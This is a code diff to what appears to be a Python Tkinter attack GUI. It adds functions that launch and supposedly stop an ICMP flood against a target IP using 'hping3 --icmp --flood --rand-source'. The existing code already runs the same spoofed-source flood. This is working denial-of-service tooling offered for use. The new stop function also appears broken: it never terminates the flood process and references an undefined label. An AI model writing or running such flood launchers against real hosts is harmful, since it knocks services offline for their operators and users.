@@ -2,6 +2,7 @@ import threading
 import traceback
 import subprocess
 import signal
+import queue
 
 from tkinter import *
 
@@ -49,3 +50,24 @@ def sendIcmpPackets(targetIP):
     global process
     terminalLabel["text"] += "$ Target IP : " + targetIP + "\n"
     process = subprocess.Popen(["hping3", "--icmp", "--flood", "--rand-source", targetIP])
+
+def startIcmpAttackChain(queue, targetIP, chainTerminalContentFrame, chainErrorContentFrame) :
+    chainTerminalLabel = Label(chainTerminalContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=278)
+    chainErrorOutputLabel = Label(chainErrorContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=278)
+    chainTerminalLabel.pack(anchor = NW)
+    chainErrorOutputLabel.pack(anchor = NW)
+
+    chainTerminalLabel["text"] += "$ Running ICMP Flood Attack...\n\n"
+    icmpFloodProcess = subprocess.Popen(["hping3", "--icmp", "--flood", "--rand-source", targetIP])
+
+    queue.put(icmpFloodProcess)
+
+def stopIcmpAttackChain(chainTerminalContentFrame, chainErrorContentFrame) :
+    chainTerminalLabel = Label(chainTerminalContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=278)
+    chainErrorOutputLabel = Label(chainErrorContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=278)
+    chainTerminalLabel.pack(anchor = NW)
+    chainErrorOutputLabel.pack(anchor = NW)
+
+    chainTerminalLabel["text"] += "\n$ Stopping ICMP Flood Attack...\n\n"
+    chainTerminalLabel["text"] += "$ ICMP Flood Attack successfully stopped!\n"
+    errorOutputLabel["text"] += traceback.format_exc()
